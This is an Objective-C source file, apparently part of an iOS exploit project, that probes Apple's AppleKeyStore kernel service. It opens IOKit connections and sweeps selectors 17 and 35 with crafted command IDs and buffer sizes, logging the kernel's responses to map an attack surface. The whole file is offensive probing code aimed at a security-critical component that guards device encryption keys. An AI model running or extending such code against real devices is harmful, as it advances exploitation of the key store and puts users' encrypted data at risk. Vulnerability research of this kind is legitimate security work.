/* ksmagic.m — s17/s35 via the STRUCT-ONLY wire (23C55).
   Device split: method-wire nonzero = 0x2c2; struct-wire 0xAA = 0x2f0.
   => the dispatcher is wire-shaped. Here: IOConnectCallStructMethod with
   command-id qwords at struct[0], sizes 8..256, verdict grid unsuppressed. */
#import <IOKit/IOKitLib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include "exploit.h"

#define ol(...) nk_log(__VA_ARGS__)

static void ks_call(io_connect_t conn, uint32_t sel, void *s, size_t inSz,
                    const char *tag) {
    uint8_t outb[256];
    size_t osz = sizeof(outb);
    kern_return_t kr = IOConnectCallStructMethod(conn, sel, s, inSz, outb, &osz);
    ol("[ksm] sel=%u tag=%s kr=0x%x osz=%zu o0=%02x%02x%02x%02x",
       sel, tag, kr, osz, outb[0], outb[1], outb[2], outb[3]);
}

void nk_ksmagic_run(void) {
    nk_filelog_open("ksmagic");
    ol("[ksm] struct-wire command-id probe");
    io_iterator_t it = 0;
    if (IOServiceGetMatchingServices(kIOMasterPortDefault,
        IOServiceMatching("AppleKeyStore"), &it) != KERN_SUCCESS)
        { ol("[ksm] no service"); nk_filelog_close(); return; }
    io_service_t svc = IOIteratorNext(it);
    if (!svc) { ol("[ksm] empty"); nk_filelog_close(); return; }
    for (uint32_t type = 0; type <= 1; type++) {
        io_connect_t conn = MACH_PORT_NULL;
        if (IOServiceOpen(svc, mach_task_self(), type, &conn) != KERN_SUCCESS || !conn)
            { ol("[ksm] open t%u failed", type); continue; }
        static const uint32_t sels[2] = {17, 35};
        static const uint64_t ids[12] = {
            0, 1, 2, 3, 4, 0x10, 0x11, 0x100, 0x1000,
            0x534d45484c4b51u /* "QKLEM..." marker */, 1ull << 40, 0xfeabf00du
        };
        static const size_t szs[8] = {8, 16, 24, 32, 48, 96, 128, 256};
        static uint8_t stb[256];
        for (int a = 0; a < 2; a++) {
            for (int q = 0; q < 12; q++) {
                for (int z = 0; z < 8; z++) {
                    memset(stb, 0, sizeof(stb));
                    memcpy(stb, &ids[q], 8);
                    char tg[24];
                    snprintf(tg, sizeof(tg), "id%llx_sz%zu",
                             (unsigned long long)ids[q], szs[z]);
                    ks_call(conn, sels[a], stb, szs[z], tg);
                }
            }
        }
        IOServiceClose(conn);
        usleep(2000);
    }
    IOObjectRelease(svc); IOObjectRelease(it);
    ol("[ksm] done");
    nk_filelog_close();
}
